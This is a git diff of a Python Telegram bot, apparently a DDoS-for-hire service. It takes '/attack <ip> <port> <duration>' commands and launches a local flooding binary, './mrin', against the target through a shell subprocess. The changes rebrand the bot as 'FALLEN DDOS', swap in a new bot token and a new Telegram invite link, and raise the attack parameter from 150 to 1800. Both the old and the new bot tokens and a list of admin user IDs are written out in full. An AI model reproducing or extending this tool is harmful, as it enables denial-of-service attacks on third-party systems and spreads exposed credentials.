@@ -3,7 +3,7 @@ import datetime
 from telegram import Update
 from telegram.ext import Application, CommandHandler, CallbackContext
 
-TELEGRAM_BOT_TOKEN = '7580203890:AAFiOEC7jHmf9jfqy7vzf5jRh65S2V67pj0'
+TELEGRAM_BOT_TOKEN = '7151529676:AAHjg4UKekjZqLdXsveFIfkOHU4OUSV0iVU'
 ADMIN_USER_IDS = {1066744659, 7383077317, 8159441634, 6265999727, 482756202, 6240348610, 1253267234, 1583238165, 1202212810}  # Add your admin IDs here as a set
 USERS_FILE = 'users.txt'
 LOG_FILE = 'log.txt'
@@ -69,9 +69,9 @@ def get_remaining_approval_time(user_id):
 async def start(update: Update, context: CallbackContext):
     chat_id = update.effective_chat.id
     message = (
-        "*❤️Welcome to the 99-OFFZONE 3hrs working DDOS ❤️*\n\n"
+        "*❤️Welcome to the FALLEN DDOS ❤️*\n\n"
         "*Use /attack <ip> <port> <duration>*\n"
-        "* @insanoic & @Vaibhav264  :- ye 3hrs k baad off ho jayega*"
+        "* @X9HYDRA & @Vaibhav264  :- PLEASE SHARE FEEDBACK *"
     )
     await context.bot.send_message(chat_id=chat_id, text=message, parse_mode='Markdown')
 
@@ -142,7 +142,7 @@ async def run_attack(chat_id, ip, port, duration, context):
     attack_in_progress = True
 
     try:
-        command = f"./mrin {ip} {port} {duration} 150 "
+        command = f"./mrin {ip} {port} {duration} 1800 "
         process = await asyncio.create_subprocess_shell(
             command,
             stdout=asyncio.subprocess.PIPE,
@@ -199,7 +199,7 @@ async def attack(update: Update, context: CallbackContext):
         f"*⚔️ Attack Launched! ⚔️*\n"
         f"*🎯 Target: {ip}:{port}*\n"
         f"*🕒 Duration: {duration} seconds*\n"
-        f"*🔥 Join :- https://t.me/+W-EyOyO3lQUxNzE1💥*"
+        f"*🔥 Join :- https://t.me/+YnFEAuV0r3VhMjJl💥*"
     ), parse_mode='Markdown')
 
     asyncio.create_task(run_attack(chat_id, ip, port, duration, context))
